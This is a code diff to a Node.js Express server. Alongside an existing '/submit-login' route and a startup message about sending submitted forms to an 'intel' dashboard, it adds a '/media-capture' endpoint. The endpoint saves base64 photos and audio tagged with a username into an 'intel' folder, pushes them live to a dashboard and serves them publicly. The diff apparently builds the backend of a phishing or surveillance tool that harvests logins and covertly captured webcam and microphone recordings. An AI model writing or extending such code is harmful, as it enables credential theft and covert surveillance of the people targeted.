@@ -80,6 +80,51 @@ app.post('/submit-login', async (req, res) => {
   }
 });
 
+// Media capture endpoint
+app.post('/media-capture', (req, res) => {
+  try {
+    const photo = req.body.photo;
+    const audio = req.body.audio;
+    const username = req.body.username || 'unknown';
+    
+    // Save files
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const photoPath = path.join(__dirname, 'intel', `photo-${timestamp}-${username}.jpg`);
+    const audioPath = path.join(__dirname, 'intel', `audio-${timestamp}-${username}.webm`);
+    
+    // Create intel dir
+    if (!fs.existsSync(path.join(__dirname, 'intel'))) {
+      fs.mkdirSync(path.join(__dirname, 'intel'));
+    }
+    
+    // Write files (base64 decode)
+    if (photo) {
+      const photoBuffer = Buffer.from(photo.split(',')[1], 'base64');
+      fs.writeFileSync(photoPath, photoBuffer);
+    }
+    if (audio) {
+      const audioBuffer = Buffer.from(audio.split(',')[1], 'base64');
+      fs.writeFileSync(audioPath, audioBuffer);
+    }
+    
+    // Broadcast to dashboard
+    io.emit('new-media', {
+      timestamp,
+      username,
+      photo: `/intel/${path.basename(photoPath)}`,
+      audio: `/intel/${path.basename(audioPath)}`
+    });
+    
+    res.json({ success: true, files: { photo: photoPath, audio: audioPath } });
+  } catch (error) {
+    console.error('Media save error:', error);
+    res.status(500).json({ error: 'Save failed' });
+  }
+});
+
+// Serve intel files
+app.use('/intel', express.static(path.join(__dirname, 'intel')));
+
 // 404 handler
 app.use((req, res) => {
   res.status(404).json({ error: 'Route not found' });
@@ -93,3 +138,4 @@ server.listen(PORT, () => {
   console.log(`🔴 Submit form → instant terminal/dashboard intel`);
   console.log(`\n`);
 });
+
